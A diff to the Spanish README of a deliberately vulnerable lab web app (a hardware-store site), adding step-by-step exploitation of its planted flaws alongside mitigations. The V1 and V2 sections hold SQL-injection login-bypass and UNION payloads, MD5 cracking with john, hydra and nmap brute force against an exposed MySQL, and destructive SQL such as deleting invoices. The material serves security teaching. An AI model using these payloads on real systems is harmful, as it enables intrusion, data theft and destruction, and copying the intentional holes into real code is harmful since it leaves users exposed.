@@ -27,7 +27,6 @@
 4. [Usuarios y credenciales de prueba](#4-usuarios-y-credenciales-de-prueba)
 5. [Vulnerabilidades implementadas](#5-vulnerabilidades-implementadas)
 6. [Flujo de trabajo en GitHub](#6-flujo-de-trabajo-en-github)
-7. [Estado del proyecto](#7-estado-del-proyecto)
 
 ---
 
@@ -203,6 +202,22 @@ ferreteria/
 └── README.md
 ```
 
+### Requerimientos y herramientas utilizadas
+
+**Entorno de desarrollo (equipo):**
+
+| Herramienta | Uso |
+|---|---|
+| Pop!_OS / Ubuntu 24.04 | Sistema operativo de desarrollo |
+| Visual Studio Code | Editor de código |
+| Extensión PHP Intelephense (VS Code) | Autocompletado y análisis de PHP |
+| Git + GitHub | Control de versiones (flujo GitFlow) |
+| Docker + Docker Compose | Contenedor de MySQL |
+| VirtualBox 7.x | Máquina virtual de despliegue (Ubuntu Server) |
+| Cliente `mysql` (o DBeaver) | Inspección y pruebas de la base de datos |
+
+**Software del servidor (VM de entrega):** Ubuntu Server 24.04, Apache 2.4 (`mod_php`),
+PHP 8.3 (`mysqli`), MySQL 8.0 (contenedor Docker), Bootstrap 5.3 (local, sin CDN).
 ---
 
 ## 3. Guía de instalación y despliegue
@@ -306,15 +321,6 @@ sudo ss -tulpn                     # Puertos en escucha
 
 Desde otro equipo de la red del laboratorio, abrir en el navegador `http://<IP-de-la-VM>`.
 
-### 3.10 Instalación automatizada
-
-Los pasos 3.3 a 3.8 están reunidos en `install.sh`:
-
-```bash
-chmod +x install.sh
-./install.sh
-```
-
 ---
 
 ## 4. Usuarios y credenciales de prueba
@@ -372,14 +378,80 @@ $sql = "SELECT id, nombre, descripcion, precio, imagen FROM productos
 
 **Consideraciones de diseño:** los mensajes de error de MySQL se muestran en pantalla para facilitar la identificación de la vulnerabilidad durante la etapa de ataque.
 
-**Mitigación (no aplicada a propósito):** usar sentencias preparadas con `mysqli_prepare()` y `bind_param()`, almacenar contraseñas con `password_hash()` / `password_verify()` y ocultar los errores de base de datos al usuario.
+**Cómo explotarla — paso a paso.**
+ 
+*Requisito previo:* un navegador web y la IP de la VM (`http://<IP-de-la-VM>`). No hace falta ninguna herramienta extra; todo se hace desde el navegador.
+ 
+**Escenario A — Saltar el login sin saber la contraseña (bypass de autenticación)**
+ 
+1. Abrir `http://<IP-de-la-VM>/login.php`.
+2. En el campo **Correo** escribir la carga maliciosa, y en **Contraseña** cualquier texto:
+```
+Correo:     admin@eltornillo.local' -- -
+Contraseña: loquesea
+```
+3. Pulsar **Entrar**.
+4. **Qué pasa por dentro:** la consulta se arma como
+```sql
+SELECT id, nombre, rol FROM usuarios
+WHERE correo = 'admin@eltornillo.local' -- -' AND password = MD5('loquesea')
+```
+   La secuencia `-- ` inicia un comentario SQL, así que la comprobación de la contraseña (`AND password = ...`) queda anulada. La consulta devuelve la fila del administrador y la aplicación abre su sesión.
+5. **Impacto:** se entra al **panel de administrador** (`admin/panel.php`) sin credenciales válidas, con control total sobre productos y usuarios.
+6. **Variante sin conocer ningún correo:** escribir `' OR '1'='1' -- -` en el campo de correo. La condición `'1'='1'` siempre es verdadera y devuelve la primera fila de la tabla (el administrador).
+ 
+**Escenario B — Detectar la inyección en el buscador**
+ 
+1. Abrir el catálogo (`http://<IP-de-la-VM>/index.php`).
+2. En el buscador escribir una sola comilla: `'` y buscar.
+3. **Qué pasa:** aparece en pantalla un **error de MySQL** (sintaxis). Ese error es la confirmación de que el texto llega sin sanear hasta la consulta: la vulnerabilidad está presente.
+**Escenario C — Robar los usuarios y sus contraseñas (extracción de datos con UNION)**
+ 
+1. En el buscador del catálogo, probar cuántas columnas devuelve la consulta con `' ORDER BY 6 -- -`, subiendo el número hasta que deje de dar error (aquí son 6 columnas).
+2. Inyectar una consulta `UNION` que lea la tabla `usuarios`. En la URL:
+```
+http://<IP-de-la-VM>/index.php?q=' UNION SELECT 1,correo,password,rol,5,6 FROM usuarios -- -
+```
+3. **Qué pasa:** el listado de "productos" ahora muestra los **correos, los hashes MD5 y el rol** de todos los usuarios, porque la segunda consulta se une a la primera.
+4. **Romper los hashes:** los valores de `password` son MD5. Se copian a un archivo y se crackean:
+```bash
+echo 'HASH_COPIADO' > hashes.txt
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+# o pegar el hash en un servicio en línea de MD5
+```
+   Las contraseñas de prueba (`Admin123`, etc.) caen de inmediato.
+5. **Impacto:** con los correos y las contraseñas ya en claro, el atacante inicia sesión como **cualquier usuario** (incluido el administrador) por la vía normal, sin dejar rastro de inyección.
+ 
+**Pistas dejadas (visibles para el atacante):**
+ 
+- El **error de MySQL** que aparece al escribir una comilla en el login o en el buscador (la pista más fuerte: revela que la entrada se usa sin sanear).
+- Un **comentario HTML** junto al buscador en `index.php` (visible con *Ver código fuente*): `<!-- buscador: filtra productos por el texto que se escribe, directo contra la tabla productos -->`, que insinúa que el texto va directo a la consulta.
+**Cómo evitarla / solventarla:**
+ 
+1. **Sentencias preparadas con parámetros** en todas las consultas que reciban datos del usuario, de modo que la entrada nunca se concatene en la cadena SQL:
+```php
+// Login seguro
+$stmt = mysqli_prepare($conn, 'SELECT id, nombre, rol, password FROM usuarios WHERE correo = ?');
+mysqli_stmt_bind_param($stmt, 's', $correo);
+mysqli_stmt_execute($stmt);
+// ...y comparar con password_verify($password, $hash)
+ 
+// Buscador seguro
+$stmt = mysqli_prepare($conn, 'SELECT ... FROM productos WHERE nombre LIKE ?');
+$patron = '%' . $q . '%';
+mysqli_stmt_bind_param($stmt, 's', $patron);
+```
+2. **Almacenar contraseñas con `password_hash()` / `password_verify()`** (bcrypt/argon2) en lugar de MD5, y ampliar la columna `usuarios.password` (p. ej. `VARCHAR(255)`).
+3. **Ocultar los errores de base de datos al usuario** en producción (`display_errors = Off`), registrándolos solo en el log del servidor, y devolver un mensaje genérico.
+4. **Validar y tipar la entrada** (longitud, formato de correo) como defensa en profundidad, sin que sustituya a las sentencias preparadas.
 
 ### V2 — Puertos abiertos innecesarios
 
 **Dónde se encuentra:** `docker/docker-compose.yml`.
 
-**Cómo se introdujo:** el puerto 3306 del contenedor de MySQL se publica en todas las interfaces de la VM (`0.0.0.0`) en lugar de limitarlo a `127.0.0.1`. La aplicación solo necesita acceder a la base de datos de forma local, por lo que esta exposición es innecesaria y permite conectarse a MySQL directamente desde cualquier equipo de la red del laboratorio.
-
+**Cómo se introdujo y por qué es explotable.** No basta con "dejar un puerto abierto": la exposición se diseñó para que lleve a un compromiso real y acotado de la base de datos. Se combinan cuatro condiciones:
+ 
+1. **Puerto publicado en todas las interfaces.** El puerto 3306 del contenedor se publica en `0.0.0.0` en lugar de `127.0.0.1`, por lo que MySQL responde a cualquier equipo de la red del laboratorio (el banner de versión se ve con `nmap -sV`).
 ```yaml
 # docker/docker-compose.yml — exposición intencional
 services:
@@ -388,42 +460,80 @@ services:
     ports:
       - "3306:3306"        # Debería ser "127.0.0.1:3306:3306"
 ```
-
+2. **Cuenta accesible en remoto.** La imagen de MySQL crea la cuenta de la aplicación como `'ferreteria_app'@'%'`, es decir, válida desde cualquier host (no solo `localhost`).
+3. **Contraseña débil.** Esa cuenta usa la contraseña `ferreteria` (igual al nombre de la base de datos): adivinable y fácil de obtener por fuerza bruta con un diccionario.
+4. **Privilegios amplios sobre la base.** `ferreteria_app` tiene **todos los privilegios sobre `ferreteria.*`**, de modo que, una vez autenticado, el atacante lee y modifica toda la información del proyecto.
+**Alcance acotado (importante).** La exposición no compromete el equipo anfitrión ni el resto de la red: la cuenta `root` **no** es accesible en remoto (el contenedor no define `MYSQL_ROOT_HOST`, así que root queda en `localhost`), y `ferreteria_app` **no** tiene los privilegios `FILE` ni `SUPER`, por lo que no puede leer/escribir archivos del sistema ni salir de la base `ferreteria`.
+ 
 **Detalle adicional:** Docker escribe sus propias reglas de `iptables`, por lo que un puerto publicado queda accesible aunque el firewall `ufw` esté activo y no lo permita.
-
+ 
 **Puertos de la VM:**
-
+ 
 | Puerto | Servicio | ¿Necesario? |
 |---|---|---|
 | 22/tcp | SSH | Sí, para administración |
 | 80/tcp | Apache (aplicación) | Sí |
 | 3306/tcp | MySQL (Docker) | **No** — expuesto intencionalmente |
-
-**Mitigación (no aplicada a propósito):** publicar el puerto solo en loopback (`127.0.0.1:3306:3306`) o no publicarlo y conectar la aplicación por una red interna de Docker.
-
-### V3 — IDOR en las facturas
-
-**Dónde se encuentra:** `public/comprador/factura.php`, la vista que muestra el detalle de una factura a partir de su identificador en la URL (`factura.php?id=<número>`).
-
-**Cómo se introdujo:** la página verifica que exista una sesión con rol de comprador, pero **no verifica que la factura solicitada pertenezca al usuario de esa sesión**. La consulta filtra únicamente por el `id` recibido, y los identificadores de factura son enteros consecutivos (`AUTO_INCREMENT`), por lo que son fáciles de predecir.
-
-```php
-// public/comprador/factura.php — control de acceso incompleto (intencional)
-require_once '../../includes/auth.php';
-requerir_rol('comprador');           // Solo valida el rol, no la propiedad
-
-$id = (int) $_GET['id'];
-$sql = "SELECT f.id, f.fecha, f.total, u.nombre, u.correo
-        FROM facturas f
-        JOIN usuarios u ON u.id = f.comprador_id
-        WHERE f.id = $id";           // Falta: AND f.comprador_id = <usuario de la sesión>
+ 
+**Cómo explotarla — paso a paso.**
+ 
+*Requisito previo:* un equipo en la misma red del laboratorio con `nmap`, `hydra` y el cliente `mysql` instalados (en Kali ya vienen; en Ubuntu: `sudo apt install nmap hydra mysql-client`). Se necesita la IP de la VM.
+ 
+**Paso 1 — Descubrir el servicio (reconocimiento)**
+ 
+1. Escanear el puerto 3306 de la VM para confirmar que MySQL está expuesto y ver su versión:
+```bash
+nmap -sV -p 3306 <IP-de-la-VM>
 ```
+2. **Qué pasa:** la salida muestra `3306/tcp open  mysql  MySQL 8.0.x`. Que el puerto responda desde otro equipo **ya es la falla**: una base de datos nunca debería verse desde la red.
+**Paso 2 — Obtener la contraseña de la cuenta (fuerza bruta)**
+ 
+1. La cuenta `ferreteria_app` es accesible en remoto y su contraseña es débil. Probar un diccionario contra ella:
+```bash
+nmap -p 3306 --script mysql-brute <IP-de-la-VM>
+# alternativa con hydra:
+hydra -l ferreteria_app -P /usr/share/wordlists/rockyou.txt <IP-de-la-VM> mysql
+```
+2. **Qué pasa:** la herramienta reporta credenciales válidas (`ferreteria_app` / `ferreteria`). Al ser la contraseña igual al nombre del sitio, cae casi de inmediato; incluso se adivina a mano.
+**Paso 3 — Conectarse a la base de datos**
+ 
+1. Conectarse directamente desde el equipo atacante con el cliente `mysql`:
+```bash
+mysql -h <IP-de-la-VM> -u ferreteria_app -pferreteria ferreteria
+```
+2. **Qué pasa:** se obtiene una consola SQL sobre la base `ferreteria`, **sin pasar por la aplicación web**.
+**Paso 4 — Leer y modificar los datos (impacto)**
+ 
+1. Leer información sensible de clientes y usuarios:
+```sql
+SELECT correo, password, rol FROM usuarios;   -- correos y hashes MD5 para crackear
+SELECT * FROM facturas;                        -- facturas y datos de los compradores
+```
+2. Manipular los datos del negocio:
+```sql
+UPDATE productos SET precio = 0.01;            -- cambiar todos los precios
+DELETE FROM facturas;                          -- borrar el historial de ventas
+UPDATE usuarios SET rol = 'admin' WHERE id = 3; -- escalar un usuario a administrador
+```
+3. **Impacto:** compromiso total de la información del proyecto: robo de datos de clientes, obtención de los hashes (que se cruzan con V1 para entrar como cualquiera), y alteración o borrado de productos, facturas y usuarios.
+> **Alcance acotado (por diseño).** Este compromiso se limita a la base `ferreteria`. La cuenta `root` no es accesible en remoto y `ferreteria_app` no tiene privilegios `FILE`/`SUPER`, así que el atacante no puede leer archivos del sistema ni tomar control de la VM.
+ 
+**Pistas dejadas (visibles para el atacante):**
+ 
+- El propio **servicio MySQL en el 3306** se anuncia a la red (lo encuentra un escaneo de puertos).
+- Un **comentario HTML** en el pie de página de todo el sitio (visible con *Ver código fuente*): `<!-- infra lab: apache2 + php 8.3 · los datos se guardan en mysql 8 (contenedor docker, :3306) · pendiente cerrar el puerto -->`, que orienta a escanear el puerto de la base.
+**Cómo evitarla / solventarla:**
+ 
+1. **No publicar el puerto en toda la red.** Publicarlo solo en loopback, o mejor, no publicarlo y comunicar la app con la base por una red interna de Docker:
+```yaml
+ports:
+  - "127.0.0.1:3306:3306"   # solo accesible desde la propia VM
+# o eliminar 'ports' y usar una red interna de Docker
+```
+2. **Contraseñas fuertes y únicas** para las cuentas de base de datos (largas, aleatorias), gestionadas fuera del repositorio (variables de entorno / secretos), nunca iguales al nombre de usuario o de la base.
+3. **Mínimo privilegio.** Que `ferreteria_app` tenga solo los privilegios que necesita (`SELECT, INSERT, UPDATE, DELETE` sobre las tablas concretas) y restringir el host de la cuenta (`'ferreteria_app'@'127.0.0.1'`) en lugar de `'%'`.
+4. **Firewall y segmentación.** Reglas de `iptables`/seguridad que bloqueen el 3306 hacia la red (recordando que Docker inserta sus propias reglas, por lo que hay que gestionarlo a nivel de la publicación del puerto, no solo con `ufw`).
 
-**Datos expuestos:** cualquier comprador autenticado puede consultar las facturas de otros clientes, con su nombre, correo, fecha, productos comprados, cantidades y montos.
-
-**Consideraciones de diseño:** el `id` se convierte a entero con `(int)`, de modo que este punto expone solo el IDOR y no se confunde con la inyección SQL de V1.
-
-**Mitigación (no aplicada a propósito):** agregar a la consulta la condición `AND f.comprador_id = ?` con el ID del usuario guardado en la sesión, responder con `403` o `404` cuando la factura no le pertenezca, y opcionalmente usar identificadores no predecibles (UUID) en las URL.
 
 ---
 
@@ -453,17 +563,3 @@ El repositorio sigue **GitFlow**.
 - Cada entrega se etiqueta en `main` (`v0.1.0` avance, `v1.0.0` entrega final).
 
 ---
-
-## 7. Estado del proyecto
-
-| Componente | Estado |
-|---|---|
-| README y arquitectura | ✅ Versión inicial |
-| Base de datos en Docker (`schema` y `seed`) | ✅ Listo |
-| Index (catálogo y buscador) | ✅ Listo |
-| Login y Register | ⏳ Pendiente |
-| Vista de comprador (carrito y facturas) | ⏳ Pendiente |
-| Vista de vendedor | ⏳ Pendiente |
-| Panel de administrador | ⏳ Pendiente |
-| Script `install.sh` | ⏳ Pendiente |
-| Prueba de instalación completa desde cero | ⏳ Pendiente |
